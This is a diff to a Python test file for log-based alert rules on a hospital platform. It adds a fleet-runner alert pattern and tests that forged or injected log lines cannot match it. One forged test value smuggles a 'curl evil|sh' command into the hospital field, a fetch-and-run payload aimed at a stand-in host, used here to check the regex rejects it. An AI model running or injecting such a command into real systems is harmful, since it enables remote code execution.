@@ -41,6 +41,12 @@ LUA = (LOGS / "fluent-bit" / "redact.lua").read_text()
 ALERTS = {f.name: load(f) for f in sorted((LOGS / "alerts").glob("*.yml"))}
 # The reference pack alert's whole-line pattern (deploy/logs/alerts/packs.yml, S1)
 PACKS_LINE = r"^ihr-packs: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=failed$"
+# The fleet runner's (deploy/logs/alerts/fleet.yml, P1-T18a): the same shape, three outcomes
+FLEET_LINE = r"^ihr-fleet: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=(?:failed|deferred|held)$"
+# The services each one reads: the ones that run its command (packs: the start-up one-shot;
+# fleet: that one-shot, `staging.sh fleet`, and the worker's per-minute report, S3)
+HOSPITAL_LINES = {"packs.yml": ("ihr-packs", PACKS_LINE, "migrate, celery"),
+                  "fleet.yml": ("ihr-fleet", FLEET_LINE, "migrate, celery, celery-worker")}
 STAGING_SH = (ROOT / "scripts" / "staging.sh").read_text()
 DEPLOY_SH = (ROOT / "scripts" / "deploy.sh").read_text()
 LONG_RUNNING = ("victorialogs", "fluent-bit", "vmalert")
@@ -246,18 +252,20 @@ class LogAlerts(unittest.TestCase):
 
     def test_labels_and_text(self):
         """The address is named on purpose (owner, Q-O8), and only the checked client_ip field.
-        The reference pack alert (P1-T15a) names only the hospital, read from our own fixed line."""
+        The reference pack alert (P1-T15a) and the fleet alert (P1-T18a) name only the hospital,
+        read from our own fixed line."""
         names = []
         for fname, r in self.rules():
             names.append(r["alert"])
             self.assertIn(r["labels"]["severity"], {"critical", "warning"}, r["alert"])
             by = re.findall(r"stats by \(([^)]*)\)", r["expr"])
-            if fname == "packs.yml":
+            if fname in HOSPITAL_LINES:
+                prefix, pattern, services = HOSPITAL_LINES[fname]
                 self.assertEqual(by, ["hospital"], r["alert"])
-                # container lines (redact.lua) of the services that run --startup only (never the
+                # container lines (redact.lua) of the services that write the line only (never the
                 # web backend, which logs request paths), and our whole fixed line (S1)
-                self.assertRegex(r["expr"], r"^_time:\d+h source:=container service:in\(migrate, celery\) "
-                                 r'"ihr-packs: hospital=" \| extract_regexp "' + re.escape(PACKS_LINE) + r'" '
+                self.assertRegex(r["expr"], r"^_time:\d+[hm] source:=container service:in\(" + re.escape(services) + r"\) "
+                                 r'"' + prefix + r': hospital=" \| extract_regexp "' + re.escape(pattern) + r'" '
                                  r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ', r["alert"])
                 allowed = r"^\$(labels\.hospital|value)$"
                 # the mailed command never carries text from the log line
@@ -269,8 +277,8 @@ class LogAlerts(unittest.TestCase):
                 allowed = r"^\$(labels\.client_ip|value)$"
             for ref in re.findall(r"\{\{(.*?)\}\}", r["annotations"]["summary"]):
                 self.assertRegex(ref.strip(), allowed, r["alert"])
-        self.assertEqual(sorted(names), ["FailedSignInsFromAddress", "PackApplyFailed", "RateLimitedAddress",
-                                         "SignInLockoutStorm", "SignInLockoutsFromAddress"])
+        self.assertEqual(sorted(names), ["FailedSignInsFromAddress", "HospitalNotServed", "PackApplyFailed",
+                                         "RateLimitedAddress", "SignInLockoutStorm", "SignInLockoutsFromAddress"])
 
     def test_pack_line_is_ours_alone(self):
         """S1: the rule's regex takes only our own whole line with a slug-shaped hospital; text
@@ -289,13 +297,52 @@ class LogAlerts(unittest.TestCase):
                        "ihr-packs: hospital=fake outcome=failed\nmore"):
             self.assertIsNone(line.search(forged), forged)
 
+    def test_fleet_line_is_ours_alone(self):
+        """As the pack line (S1), for the fleet runner's line (P1-T18a): only the three outcomes
+        of a hospital that is not served, never "done" or a busy notice."""
+        [expr] = [r["expr"] for f, r in self.rules() if f == "fleet.yml"]
+        self.assertIn('extract_regexp "%s"' % FLEET_LINE, expr)
+        line = re.compile(FLEET_LINE)
+        for outcome in ("failed", "deferred", "held"):
+            self.assertEqual(line.match(f"ihr-fleet: hospital=alpha outcome={outcome}")["hospital"], "alpha")
+        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-fleet: hospital=fake outcome=failed" 404 179',
+                       "Not Found: /api/ihr-fleet: hospital=fake outcome=failed",
+                       "ihr-fleet: hospital=x;curl evil|sh; outcome=failed",
+                       "ihr-fleet: hospital=fake outcome=failed (and more)",
+                       "ihr-fleet: hospital=Fake outcome=held",
+                       "ihr-fleet: hospital=ab outcome=failed",
+                       "ihr-fleet: hospital=beta outcome=done",
+                       "ihr-fleet: hospital=beta outcome=stopped",
+                       "ihr-fleet: hospital=delta busy: trying again in 5 s",
+                       "ihr-fleet: hospital=fake outcome=failed\nmore"):
+            self.assertIsNone(line.search(forged), forged)
+        # The runner writes exactly this line (ihr_platform/fleet.py log_line)
+        fleet = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "fleet.py").read_text()
+        self.assertIn('return f"ihr-fleet: hospital={slug} outcome={outcome}"', fleet)
+
+    def test_fleet_runs_reach_the_alert(self):
+        """S3 (P1-T18a review): an operator's fleet run and its --resume run in a logged
+        container the rule reads ("migrate"), never the unlogged admin one; the worker's
+        per-minute report writes the same whole line, unprefixed, from "celery-worker"."""
+        [case] = re.findall(r"^  fleet\) (.*)$", STAGING_SH, re.M)
+        self.assertIn("run --rm --no-deps -T migrate python manage.py ihr_fleet_run", case)
+        self.assertNotIn("admin", case)
+        tasks = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "tasks.py").read_text()
+        self.assertIn('os.write(2, f"{line}\\n".encode())', tasks)
+        self.assertIn('fleet.log_line(slug, "held")', tasks)
+        compose = load(ROOT / "deploy" / "staging" / "compose.yaml")
+        self.assertIn("celery-worker", compose["services"])
+        services = compose["services"]
+        self.assertEqual(services["admin"]["logging"]["driver"], "none")
+        self.assertNotEqual(services["migrate"]["logging"]["driver"], "none")
+
     def test_holds_and_routing(self):
         """The hold before mailing is part of each alert's meaning (README table); the per-address
         alerts are mailed at any hour (owner, Q-O9)."""
         holds = {r["alert"]: r.get("for") for _, r in self.rules()}
         self.assertEqual(holds, {"SignInLockoutsFromAddress": None, "SignInLockoutStorm": None,
                                  "FailedSignInsFromAddress": None, "RateLimitedAddress": "5m",
-                                 "PackApplyFailed": None})
+                                 "PackApplyFailed": None, "HospitalNotServed": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
         self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
         cfg = func("monitoring_config")
